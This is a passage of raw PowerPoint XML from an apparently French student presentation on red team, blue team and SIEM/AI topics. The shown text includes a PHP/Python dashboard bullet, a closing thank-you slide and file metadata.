              <a:buSzPts val="1350"/>
              <a:buFont typeface="Calibri"/>
              <a:buChar char="–"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Développer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> un tableau de bord de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>visualisation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>dédié</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> (PHP/Python)</a:t>
            </a:r>
            <a:endParaRPr sz="1350" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="345" name="Google Shape;345;p18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11368735" y="6400800"/>
            <a:ext cx="54864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B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1000"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>17</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none"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0"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="34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1"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="10" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="34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44"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="34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43"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="16" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="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 grpId="0"/>
      <p:bldP spid="341" grpId="0"/>
      <p:bldP spid="343" grpId="0"/>
      <p:bldP spid="34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0"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="351" name="Google Shape;351;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10607040" y="-1097280"/>
            <a:ext cx="3657600" cy="3657600"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EAF2F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19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-1463040" y="5120640"/>
            <a:ext cx="3108960" cy="3108960"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEF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19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="2286000"/>
            <a:ext cx="10058400" cy="100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72A"/>
              </a:buClr>
              <a:buSzPts val="5000"/>
              <a:buFont typeface="Cambria"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="7600" b="1" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Cambria"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="Cambria"/>
                <a:sym typeface="Cambria"/>
              </a:rPr>
              <a:t>MERCI</a:t>
            </a:r>
            <a:endParaRPr sz="7600" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="354" name="Google Shape;354;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822948" y="3291850"/>
            <a:ext cx="112932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E9E5E"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Questions &amp; discussion</a:t>
            </a:r>
            <a:endParaRPr sz="1800" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="355" name="Google Shape;355;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="4206240"/>
            <a:ext cx="1371600" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E11D4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19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="822960" y="4206240"/>
            <a:ext cx="1371600" cy="310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RED TEAM</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="357" name="Google Shape;357;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2331720" y="4206240"/>
            <a:ext cx="1371600" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E86C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19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2331720" y="4206240"/>
            <a:ext cx="13716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BLUE TEAM</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="359" name="Google Shape;359;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3840480" y="4206240"/>
            <a:ext cx="1371600" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9770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19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3840480" y="4206240"/>
            <a:ext cx="13716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SIEM · IA</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="361" name="Google Shape;361;p19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1737360" y="6162900"/>
            <a:ext cx="8229600" cy="36576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B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1250"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Soukaina </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Douazi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> — HESTIM, Année </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>universitaire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t> 2025 / 2026</a:t>
            </a:r>
            <a:endParaRPr sz="1250" b="0" i="0" u="none" strike="noStrike" cap="none"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9290083-bd2f-48a2-8ac5-09a524b17d15}" enabled="1" method="Privileged" siteId="{b9fec68c-c92d-461e-9a97-3d03a0f18b82}" contentBits="1" removed="0"/>
</clbl:labelList>
</file>

<file path=docProps/app.xml><?xml version="1.0" encoding="utf-8"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">
  <TotalTime>4422</TotalTime>
  <Words>2435</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Grand écran</PresentationFormat>
  <Paragraphs>259</Paragraphs>
  <Slides>18</Slides>
  <Notes>18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18</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="24" baseType="lpstr">
      <vt:lpstr>Cambria</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Georgia</vt:lpstr>
      <vt:lpstr>Calibri</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bety</dc:creator>
  <cp:lastModifiedBy>NOUGA, Amar</cp:lastModifiedBy>
  <cp:revision>18</cp:revision>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-25T17:47:46Z</dcterms:modified>
</cp:coreProperties>
</file>